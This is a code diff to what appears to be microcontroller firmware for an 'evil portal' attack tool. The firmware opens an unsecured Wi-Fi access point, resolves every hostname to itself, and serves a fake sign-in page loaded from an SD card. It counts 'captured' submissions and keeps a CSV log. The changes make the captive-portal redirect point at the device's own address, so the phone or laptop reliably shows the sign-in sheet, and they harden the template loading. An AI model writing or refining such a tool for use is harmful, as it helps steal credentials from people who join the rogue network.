@@ -36,6 +36,7 @@ static WebServer s_web(80);
 static File s_csv;
 static bool s_csvOpen = false;
 static String s_template;     // page HTML (SD template or built-in)
+static String s_apIp;         // captive redirect target = our own AP IP
 static int s_captured = 0;
 static int s_hits = 0;        // page views
 static volatile bool s_dirty = true;
@@ -61,7 +62,10 @@ static void loadTemplate() {
   if (SD.cardType() != CARD_NONE && SD.exists("/evil_portal/index.html")) {
     File f = SD.open("/evil_portal/index.html", FILE_READ);
     if (f) {
-      while (f.available()) s_template += (char)f.read();
+      size_t sz = f.size();
+      if (sz > 24576) sz = 24576;          // hard cap so a huge file can't OOM us
+      s_template.reserve(sz + 1);          // single alloc, avoid byte-by-byte realloc churn
+      while (f.available() && s_template.length() < sz) s_template += (char)f.read();
       f.close();
       Serial.printf("[evil] loaded SD template (%d bytes)\n", s_template.length());
     }
@@ -78,9 +82,10 @@ static void handleRoot() {
   s_web.send(200, "text/html", s_template);
 }
 
-// OS captive-portal probes -> bounce to the portal so the "sign in" sheet pops.
+// OS captive-portal probes -> bounce to our own portal so the "sign in" sheet pops
+// (redirecting to a real third-party IP can make the OS think internet is up).
 static void handleRedirect() {
-  s_web.sendHeader("Location", "http://1.1.1.1/", true);
+  s_web.sendHeader("Location", "http://" + s_apIp + "/", true);
   s_web.send(302, "text/plain", "");
 }
 
@@ -156,6 +161,7 @@ void run() {
   WiFi.softAP(AP_SSID);            // open network
   delay(200);
   IPAddress ip = WiFi.softAPIP();
+  s_apIp = ip.toString();          // used by captive-probe redirects
   s_dns.start(DNS_PORT, "*", ip);  // resolve every host to us
 
   s_web.on("/", handleRoot);
